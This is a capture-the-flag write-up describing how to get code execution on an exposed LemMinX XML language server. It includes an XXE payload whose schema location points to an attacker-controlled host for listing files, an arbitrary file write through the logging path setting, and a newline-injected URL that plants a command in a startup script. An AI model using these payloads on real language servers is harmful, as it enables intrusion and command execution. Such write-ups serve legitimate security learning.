# LemMinX

* Category: Misc
* Score: 360/500
* Solves: 7

## Description

A weird service speaking a weird protocol. I think it is really safe to expose it to the public right? 🤔

## Overview

This challenges expose a direct socket access to [LemMinX](https://github.com/eclipse/lemminx) language server, the target is to get RCE.

## Solution

First, to communicate with the service you need to refer to [Language Server Protocol](https://microsoft.github.io/language-server-protocol/).

Also, since the server binary used here is exactly the same one as [Red Hat's XML Language Support](https://marketplace.visualstudio.com/items?itemName=redhat.vscode-xml), you can install it in VSCode to change the `xml.trace.server` setting the let it dump its JSON-RPC messages to help you figure out how it works.

The rough exploit idea is to find the randomly generated folder in `/home/ctf` first, then use arbitrary file write to write something to get code execution.

### Listing files

Since this is a XML language server, it is very likely to have XXE bugs. Also, the server is written in Java so XXE does allow us to list files. What I found is to abuse its hover feature the get XXE:

```xml
<project xmlns="http://maven.apache.org/POM/4.0.0"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
  http://YOUR_SERVER/xxe.xsd">
  <modelVersion>
    aasdas
  </modelVersion>
</project>
```

When you try to hover on `modelVersion` it will try to read the file `xxe.xsd` from your server and display the description, and it is vulnerable to XXE so you can list dir with this.

> You can try this in VSCode, btw. It actually works.

You can refer to these files:

* [exp/solve_part1.py](exp/solve_part1.py)
* [exp/hello.xml](exp/hello.xml)
* [exp/xxe.xsd](exp/xxe.xsd)

It is necessary to run a server serving these files and modify `xxe.xsd` before running the exploit `python solve_part1.py $IP $PORT`.

### Arbitrary file write

You can find there is a logging feature by reading the [official documentation](https://github.com/eclipse/lemminx/blob/main/docs/Configuration.md#logging) or reading dumped initialization messages. So setting the log path to any file we want to write does the job.

The next step is to find some way to let user controlled string being logged, for example I use [resource download](https://github.com/eclipse/lemminx/blob/267551a24de8f6b3ae8c430de013340931f22be9/org.eclipse.lemminx/src/main/java/org/eclipse/lemminx/uriresolver/CacheResourcesManager.java#L213) message control the output.

### RCE

As for which file to write, it is easy to see `/home/ctf/?/run.sh` is `-rwxr-xr-x 1 ctf ctf`, so we can easily write some commands to that file and get command execution.

Use `python solve_part2.py $IP $PORT $FOLDER_NAME` to write, and `run.sh` will looks like this:

```sh
#!/bin/sh
timeout 10 ./lemminx-linux
Nov 27, 2022 2:46:55 AM org.eclipse.lemminx.XMLLanguageServer initialize
INFO: Initializing XML Language server
LemMinX Server info:
 - Version : 0.19.1
 - Native Image
 - VM Version : 1.8.0_272
 - Git [Branch 6059965ad91cd67cba1c91f4b82714c57dc64fa5] 6059965 - [maven-release-plugin] prepare release 0.19.1
Nov 27, 2022 2:46:55 AM org.eclipse.lemminx.uriresolver.CacheResourcesManager lambda$downloadResource$0
INFO: Downloading http://random/%0a/printflag%20%23 to /tmp/peko/cache/http/random/
/printflag #...
Nov 27, 2022 2:46:55 AM org.eclipse.lemminx.uriresolver.CacheResourcesManager lambda$downloadResource$0
SEVERE: Error while downloading http://random/%0a/printflag%20%23 to /tmp/peko/cache/http/random/
/printflag # : [java.net.UnknownHostException] random
```

So simply exit the language server and it will execute `/printflag` for you. Also, you don't need the third connection because shell script is [actually interpreted line by line](https://stackoverflow.com/a/19430939).
